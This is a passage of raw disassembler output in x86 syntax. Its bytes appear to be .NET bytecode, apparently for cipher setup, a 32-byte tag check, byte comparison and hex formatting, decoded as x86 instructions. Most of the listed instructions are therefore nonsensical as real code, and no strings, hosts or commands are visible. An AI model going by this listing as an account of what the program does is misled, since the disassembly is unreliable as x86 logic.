  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 d8             	add    %dh,-0x28(%edx)
  4042d8:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 06             	add    %dh,0x6(%edx)
  40436b:	27                   	daa
  40436c:	00 70 73             	add    %dh,0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	5c                   	pop    %esp
  404507:	27                   	daa
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 62    	or     %dl,0x6272060d(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 72    	or     %dl,0x7272060d(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
